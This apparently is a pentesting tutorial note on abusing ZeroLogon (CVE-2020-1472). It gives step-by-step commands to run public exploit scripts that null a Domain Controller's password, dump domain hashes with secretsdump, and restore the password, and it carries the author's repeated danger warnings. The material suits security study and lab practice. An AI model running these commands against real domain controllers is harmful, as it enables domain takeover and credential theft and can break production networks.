# I. Abusing Zero Logon

Disclaimer: This is a very dangerous attack to run in a real-world assessment.

This vulnerability attacks the Domain Controller, sets the password to null thereby taking it over because we can authentic without a password. What makes this dangerous is that, if the password is not restored after, it will break the Domain Controller.

On our kali machine, move to the `/opt` directory and clone this repo: https://github.com/dirkjanm/CVE-2020-1472

Move into the repo. Copy the **`zerologon_tester.py`** file from this repo https://github.com/SecuraBV/CVE-2020-1472into the current directory.

All we need for the zero logon tester is the name of the Domain Controller and the IP address.

`python3 zerologon_tester.py <DOMAIN CONTROLLER> <DC-IP>`

Next to run the exploit all we need to do is use

`python3 cve-2020-1472-exploit.py <DOMAIN CONTROLLER> <DC-IP>`

To check, use secretsdump

`secretsdump.py -just-dc <DOMAIN>/<DOMAIN CONTROLLER>\$@<DC-IP>`

Now to restore, first copy the administrator hash and

`secretsdump.py administrator@<DC-IP> -hash <hash>`

Then copy the entire plain password hex.

Now back in the exploit folder run

`python3 restorepassword.py <DOMAIN>/<DOMAIN CONTROLLER>@<DOMAIN CONTROLLER> -target-ip <DC-IP> -hexpass <password hex>`

Done!!…Remember, this is a very dangerous attack. Please don’t run it during a pentest 🙂.

**NOTE: For some reason, the attack kept failing on my end. Kept saying my DC is patched?? (WTF).**

## Resources:

What is ZeroLogon? - [https://www.trendmicro.com/en_us/what-is/zerologon.html](https://www.trendmicro.com/en_us/what-is/zerologon.html)

dirkjanm CVE-2020-1472 - [https://github.com/dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)

SecuraBV ZeroLogon Checker - [https://github.com/SecuraBV/CVE-2020-1472](https://github.com/SecuraBV/CVE-2020-1472)